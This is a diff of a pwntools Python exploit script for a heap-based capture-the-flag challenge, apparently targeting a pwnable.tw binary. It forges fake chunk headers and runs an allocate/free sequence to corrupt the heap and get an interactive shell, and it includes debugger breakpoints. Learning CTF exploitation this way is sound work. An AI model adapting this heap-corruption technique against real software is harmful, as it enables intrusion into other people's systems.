@@ -11,19 +11,18 @@
 #!/usr/bin/env python3
 from pwn import *
 
+# p = remote("chall.pwnable.tw", "10308")
 elf = ELF("./vuln")
 libc = ELF("./libc.so.6")
 context.update(binary=elf, log_level="debug")
 p = elf.process()
-# gdb.attach(
-#     p,
-#     """
-#     breakrva 0x0E0E
-#     breakrva 0x0E1A
-#     """,
-# )
-# Allocate, Free
-# p = remote("159.89.203.225", "10003")
+gdb.attach(
+    p,
+    """
+    breakrva 0x0E0E
+    breakrva 0x0E1A
+    """,
+)
 
 def Allocate(size, data):
     p.sendlineafter(b"You Choice:", b"1")
@@ -37,10 +36,10 @@ def Free(idx):
     return
 
 # 2 | 2000 | +0x40
-
 Allocate(0x60, p64(0) + p64(0x71))   # 0
 Allocate(0x60, p64(0) + p64(0x51))   # 1
-Allocate(0x60, p64(0)*3 + p64(0x51)) # 2
+Allocate(0x60, p64(0) + p64(0x51))   # 2
+Allocate(0x60, p64(0)*3 + p64(0x51)) # 3
 
 Free(1)
 Free(0)
@@ -49,16 +48,12 @@ Free(1)
 Allocate(0x60, b"\x10")
 Allocate(0x60, b"a")     
 Allocate(0x60, b"a")
-Allocate(0x60, b"a")
-
-Free(0)
-Allocate(0x60, p64(0x10) + p64(0x101))
-
+Allocate(0x60, p64(0)*11 + p64(0x101))
+pause()
 Free(6)
 
 
 p.interactive()
-
 ```
 
 ```python
